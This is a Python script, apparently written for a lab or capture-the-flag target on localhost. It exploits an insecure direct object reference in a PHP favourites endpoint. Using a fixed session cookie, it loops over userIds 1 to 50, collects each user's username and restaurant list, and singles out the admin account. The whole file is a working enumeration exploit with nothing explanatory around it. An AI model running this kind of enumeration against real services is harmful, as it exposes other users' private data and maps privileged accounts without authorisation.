import requests
import json

# Configuration
base_url = "http://127.0.0.1:32825"
endpoint = "/api/get_favorite_restaurants.php"
session_cookie = {'PHPSESSID': 'hk4mi61pda6ge5d66s5qjhkil3'}

print("[*] IDOR Enumeration - Final Analysis")
print(f"[*] Target: {base_url}{endpoint}\n")

# Function to check userId

def check_user(user_id):
    url = f"{base_url}{endpoint}?userId={user_id}"
    
    try:
        response = requests.get(url, cookies=session_cookie, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            success = data.get('success', False)
            
            if not success:
                return None
            
            user_data = data.get('data', {})
            username = user_data.get('username', 'Unknown')
            restaurants = user_data.get('restaurants', [])
            
            return {
                'userId': user_id,
                'username': username,
                'restaurant_count': len(restaurants),
                'restaurants': restaurants,
                'full_response': data
            }
    except Exception as e:
        print(f"[!] Error checking userId {user_id}: {e}")
        return None

# Check all user IDs
results = []
print("[*] Enumerating users 1-50...")

for user_id in range(1, 51):
    result = check_user(user_id)
    if result:
        results.append(result)
        
        username = result['username']
        rest_count = result['restaurant_count']
        admin_marker = " [ADMIN]" if username == "admin" else ""
        
        print(f"[+] userId {user_id:2d}: {username:<15} - {rest_count:2d} restaurants{admin_marker}")

# Find admin account
admin_user = None
for result in results:
    if result['username'] == 'admin':
        admin_user = result
        break

# Summary
print("\n" + "="*60)
print("IDOR ENUMERATION COMPLETE")
print("="*60)
print(f"Total valid users found: {len(results)}")

if admin_user:
    print("\n[!] ADMIN ACCOUNT DETECTED!")
    print("="*60)
    print(f"User ID: {admin_user['userId']}")
    print(f"Username: {admin_user['username']}")
    print(f"Restaurant count: {admin_user['restaurant_count']}")
    print(f"Restaurants: {', '.join(admin_user['restaurants'])}")
    print("\n[+] CONFIRMED: userId=7 is the admin account!")
else:
    print("[-] No admin account found in user IDs 1-50")

# Additional analysis
restaurant_data = {}
for result in results:
    for restaurant in result['restaurants']:
        if restaurant not in restaurant_data:
            restaurant_data[restaurant] = []
        restaurant_data[restaurant].append(result['userId'])

print("\n[*] Restaurant popularity across users:")
for restaurant in sorted(restaurant_data.keys()):
    users = restaurant_data[restaurant]
    admin_star = " ★" if 7 in users else ""
    print(f"  {restaurant}: {len(users)} users{admin_star}")

print(f"\nTotal unique restaurants: {len(restaurant_data)}")

